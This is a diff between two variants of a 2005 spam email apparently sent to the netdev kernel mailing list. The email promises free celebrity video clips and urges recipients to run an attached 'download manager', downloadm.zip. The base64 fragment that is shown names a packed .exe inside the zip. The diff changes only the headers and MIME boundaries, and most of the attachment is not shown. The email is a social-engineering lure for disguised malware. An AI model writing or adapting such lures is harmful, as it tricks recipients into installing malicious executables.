@@ -1,19 +1,19 @@
-From: info@hotmail.com
-Subject: Paris Hilton & Nicole Richie
-Date: Thu, 15 Dec 2005 15:54:29 UTC
-Message-ID: <deb59c51.7b31928e63@hotmail.com>
+From: postman@intel.com
+Subject: Paris_Hilton_&_Nicole_Richie
+Date: Thu, 15 Dec 2005 15:32:18 GMT
+Message-ID: <209c138503de95b5ac28@intel.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="0dad3fd75e2.8e86ac05"
+Content-Type: multipart/mixed; boundary="======ebe2c99571dedf1.a9c295"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: mailserver7615@oss.sgi.com
+To: email@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---0dad3fd75e2.8e86ac05
+--======ebe2c99571dedf1.a9c295
 
 The Simple Life:
 
@@ -21,7 +21,7 @@ View Paris Hilton & Nicole Richie video clips , pictures & more ;)
 Download is free until Jan, 2006!
 
 Please use our Download manager.
---0dad3fd75e2.8e86ac05
+--======ebe2c99571dedf1.a9c295
 Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="downloadm.zip"
@@ -1001,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---0dad3fd75e2.8e86ac05--
+--======ebe2c99571dedf1.a9c295--
